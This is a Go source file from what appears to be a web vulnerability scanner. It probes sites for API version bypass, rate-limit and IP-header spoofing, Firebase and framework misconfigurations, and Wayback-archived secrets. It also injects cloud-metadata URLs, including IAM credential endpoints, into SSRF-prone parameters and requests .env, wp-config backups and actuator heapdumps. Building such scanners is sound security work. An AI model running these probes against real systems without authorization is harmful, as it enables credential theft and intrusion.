package scanner

import (
	"encoding/json"
	"fmt"
	"strings"
	"sync"

	"github.com/zanicool/apex-cli/pkg/crawler"
	"github.com/zanicool/apex-cli/pkg/engine"
	"github.com/zanicool/apex-cli/pkg/oob"
)

func scanAPIVersionBypass(cfg *engine.Config, http *engine.HTTPClient, crawl *crawler.Result, _ *oob.Client) []Finding {
	var findings []Finding
	for u := range crawl.Params {
		if !strings.Contains(u, "/v2/") && !strings.Contains(u, "/v3/") && !strings.Contains(u, "/api/") {
			continue
		}
		// Try downgrading API version
		versions := []string{"/v1/", "/v0/", "/v2/", "/v3/", "/internal/", "/beta/", "/alpha/"}
		for _, v := range versions {
			if strings.Contains(u, v) {
				continue
			}
			for _, orig := range []string{"/v1/", "/v2/", "/v3/", "/api/"} {
				if strings.Contains(u, orig) {
					testURL := strings.Replace(u, orig, v, 1)
					resp := http.Get(testURL)
					if resp.Err == nil && resp.StatusCode == 200 && len(resp.Body) > 50 {
						findings = append(findings, Finding{Type: "API Version Bypass", Severity: "medium", URL: testURL, Detail: fmt.Sprintf("Older/internal API version %s accessible", v), Template: "apex-api-version"})
					}
					break
				}
			}
		}
	}
	return findings
}

func scanRateLimitBypass(cfg *engine.Config, http *engine.HTTPClient, crawl *crawler.Result, _ *oob.Client) []Finding {
	var findings []Finding
	if len(crawl.Pages) == 0 {
		return findings
	}
	target := crawl.Pages[0].URL
	// Try bypass headers
	bypassHeaders := []struct{ header, value string }{
		{"X-Forwarded-For", "127.0.0.1"}, {"X-Real-IP", "1.2.3.4"},
		{"X-Originating-IP", "127.0.0.1"}, {"X-Client-IP", "127.0.0.1"},
		{"X-Forwarded-Host", "localhost"}, {"X-Remote-Addr", "127.0.0.1"},
	}
	// First trigger rate limit
	for i := 0; i < 20; i++ {
		http.Get(target)
	}
	resp := http.Get(target)
	if resp.Err != nil || resp.StatusCode != 429 {
		return findings // No rate limit to bypass
	}
	for _, b := range bypassHeaders {
		items := []engine.RequestItem{{URL: target, Method: "GET", Headers: map[string]string{b.header: b.value}}}
		for r := range http.BatchRequest(items, 1) {
			if r.Err == nil && r.StatusCode == 200 {
				findings = append(findings, Finding{Type: "Rate Limit Bypass", Severity: "medium", URL: target, Detail: fmt.Sprintf("Header %s: %s bypasses rate limiting", b.header, b.value), Template: "apex-ratelimit-bypass"})
				return findings
			}
		}
	}
	return findings
}

func scanCloudMetadata(cfg *engine.Config, http *engine.HTTPClient, crawl *crawler.Result, _ *oob.Client) []Finding {
	var findings []Finding
	metadataURLs := []struct{ url, detect, cloud string }{
		{"http://169.254.169.254/latest/meta-data/", "ami-id", "AWS"},
		{"http://169.254.169.254/latest/meta-data/iam/security-credentials/", "AccessKeyId", "AWS IAM"},
		{"http://metadata.google.internal/computeMetadata/v1/", "attributes", "GCP"},
		{"http://169.254.169.254/metadata/instance?api-version=2021-02-01", "compute", "Azure"},
		{"http://169.254.170.2/v2/credentials", "AccessKeyId", "AWS ECS"},
	}
	ssrfParams := []string{"url", "uri", "src", "link", "fetch", "proxy", "dest", "redirect"}
	for u, params := range crawl.Params {
		for _, p := range params {
			if !containsAnyStr(strings.ToLower(p), ssrfParams) {
				continue
			}
			for _, meta := range metadataURLs {
				testURL := injectParam(u, p, meta.url)
				resp := http.Get(testURL)
				if resp.Err == nil && strings.Contains(resp.Body, meta.detect) {
					findings = append(findings, Finding{Type: fmt.Sprintf("SSRF → %s Cloud Metadata", meta.cloud), Severity: "critical", URL: testURL, Param: p, Detail: fmt.Sprintf("Cloud metadata accessed via SSRF — %s credentials exposed", meta.cloud), Template: "apex-ssrf-cloud"})
					return findings
				}
			}
		}
	}
	return findings
}

func scanFirebaseMisconfig(cfg *engine.Config, http *engine.HTTPClient, crawl *crawler.Result, _ *oob.Client) []Finding {
	var findings []Finding
	// Look for Firebase config in pages
	for _, page := range crawl.Pages[:min(20, len(crawl.Pages))] {
		resp := http.Get(page.URL)
		if resp.Err != nil {
			continue
		}
		if strings.Contains(resp.Body, "firebaseConfig") || strings.Contains(resp.Body, "firebase.initializeApp") {
			// Extract project ID
			if idx := strings.Index(resp.Body, "projectId"); idx > 0 {
				chunk := resp.Body[idx : idx+min(100, len(resp.Body)-idx)]
				// Try accessing Firestore without auth
				if strings.Contains(chunk, "\"") {
					parts := strings.Split(chunk, "\"")
					if len(parts) >= 3 {
						projectID := parts[2]
						firestoreURL := fmt.Sprintf("https://firestore.googleapis.com/v1/projects/%s/databases/(default)/documents", projectID)
						fResp := http.Get(firestoreURL)
						if fResp.Err == nil && fResp.StatusCode == 200 && strings.Contains(fResp.Body, "documents") {
							findings = append(findings, Finding{Type: "Firebase Firestore — Public Read", Severity: "high", URL: firestoreURL, Detail: "Firestore database readable without authentication", Template: "apex-firebase"})
						}
					}
				}
			}
		}
	}
	return findings
}

func scanWaybackSecrets(cfg *engine.Config, http *engine.HTTPClient, crawl *crawler.Result, _ *oob.Client) []Finding {
	var findings []Finding
	// Check Wayback Machine for old endpoints
	waybackURL := fmt.Sprintf("https://web.archive.org/cdx/search/cdx?url=%s/*&output=json&fl=original&collapse=urlkey&limit=100", cfg.Target)
	resp := http.Get(waybackURL)
	if resp.Err != nil || resp.StatusCode != 200 {
		return findings
	}
	var urls [][]string
	json.Unmarshal([]byte(resp.Body), &urls)

	sensitivePatterns := []string{".env", "config", "admin", "backup", "secret", "api-key", "token", ".sql", ".bak", "phpinfo", "debug"}
	for _, row := range urls {
		if len(row) == 0 {
			continue
		}
		url := row[0]
		for _, pattern := range sensitivePatterns {
			if strings.Contains(strings.ToLower(url), pattern) {
				// Check if still accessible
				r := http.Get(url)
				if r.Err == nil && r.StatusCode == 200 && len(r.Body) > 50 {
					findings = append(findings, Finding{Type: "Wayback Machine — Forgotten Endpoint", Severity: "medium", URL: url, Detail: "Historical URL still accessible", Template: "apex-wayback"})
				}
				break
			}
		}
	}
	return findings
}

func scanTechSpecific(cfg *engine.Config, http *engine.HTTPClient, crawl *crawler.Result, _ *oob.Client) []Finding {
	var findings []Finding
	if len(crawl.Pages) == 0 {
		return findings
	}
	resp := http.Get(crawl.Pages[0].URL)
	if resp.Err != nil {
		return findings
	}
	body := strings.ToLower(resp.Body)
	baseURL := strings.Split(crawl.Pages[0].URL, "/")[0] + "//" + strings.Split(crawl.Pages[0].URL, "/")[2]

	// Next.js specific
	if strings.Contains(body, "_next/") || strings.Contains(body, "__next") {
		// Check _next/data for data leakage
		r := http.Get(baseURL + "/_next/data/")
		if r.Err == nil && r.StatusCode == 200 {
			findings = append(findings, Finding{Type: "Next.js Data Directory Exposed", Severity: "medium", URL: baseURL + "/_next/data/", Template: "apex-nextjs-data"})
		}
		// Check for build manifest
		r2 := http.Get(baseURL + "/_next/static/chunks/webpack.js")
		if r2.Err == nil && r2.StatusCode == 200 {
			findings = append(findings, Finding{Type: "Next.js Webpack Chunks Exposed", Severity: "low", URL: baseURL + "/_next/static/chunks/webpack.js", Template: "apex-nextjs-webpack"})
		}
	}

	// Laravel specific
	if strings.Contains(resp.Headers.Get("Set-Cookie"), "laravel_session") {
		r := http.Get(baseURL + "/.env")
		if r.Err == nil && r.StatusCode == 200 && strings.Contains(r.Body, "APP_KEY") {
			findings = append(findings, Finding{Type: "Laravel .env Exposed", Severity: "critical", URL: baseURL + "/.env", Detail: "Laravel environment file with APP_KEY exposed", Template: "apex-laravel-env"})
		}
		r2 := http.Get(baseURL + "/telescope")
		if r2.Err == nil && r2.StatusCode == 200 {
			findings = append(findings, Finding{Type: "Laravel Telescope Debug Panel", Severity: "high", URL: baseURL + "/telescope", Template: "apex-laravel-telescope"})
		}
	}

	// WordPress specific
	if strings.Contains(body, "wp-content") {
		r := http.Get(baseURL + "/wp-json/wp/v2/users")
		if r.Err == nil && r.StatusCode == 200 && strings.Contains(r.Body, "slug") {
			findings = append(findings, Finding{Type: "WordPress User Enumeration", Severity: "medium", URL: baseURL + "/wp-json/wp/v2/users", Detail: "WordPress REST API exposes usernames", Template: "apex-wp-users"})
		}
		r2 := http.Get(baseURL + "/wp-config.php.bak")
		if r2.Err == nil && r2.StatusCode == 200 && strings.Contains(r2.Body, "DB_PASSWORD") {
			findings = append(findings, Finding{Type: "WordPress Config Backup Exposed", Severity: "critical", URL: baseURL + "/wp-config.php.bak", Template: "apex-wp-config"})
		}
	}

	// Spring Boot Actuator
	actuatorPaths := []string{"/actuator", "/actuator/env", "/actuator/heapdump", "/actuator/mappings"}
	for _, path := range actuatorPaths {
		r := http.Get(baseURL + path)
		if r.Err == nil && r.StatusCode == 200 && (strings.Contains(r.Body, "beans") || strings.Contains(r.Body, "spring") || strings.Contains(r.Body, "java")) {
			findings = append(findings, Finding{Type: "Spring Boot Actuator Exposed", Severity: "high", URL: baseURL + path, Detail: "Spring actuator endpoint accessible — may expose secrets/heapdump", Template: "apex-actuator"})
		}
	}
	return findings
}

func scanIPHeaderSpoofing(cfg *engine.Config, http *engine.HTTPClient, crawl *crawler.Result, _ *oob.Client) []Finding {
	var findings []Finding
	if len(crawl.Pages) == 0 {
		return findings
	}
	target := crawl.Pages[0].URL
	spoofHeaders := []string{"X-Forwarded-For", "X-Real-IP", "X-Originating-IP", "X-Client-IP", "True-Client-IP", "CF-Connecting-IP"}
	baseResp := http.Get(target)
	if baseResp.Err != nil {
		return findings
	}
	for _, header := range spoofHeaders {
		items := []engine.RequestItem{{URL: target, Method: "GET", Headers: map[string]string{header: "127.0.0.1"}}}
		for resp := range http.BatchRequest(items, 1) {
			if resp.Err == nil && resp.Body != baseResp.Body && resp.StatusCode == 200 {
				findings = append(findings, Finding{Type: "IP Header Spoofing Accepted", Severity: "medium", URL: target, Detail: fmt.Sprintf("Header %s: 127.0.0.1 changes response — IP-based access control bypassable", header), Template: "apex-ip-spoof"})
				return findings
			}
		}
	}
	return findings
}

var _ = sync.Mutex{} // ensure import
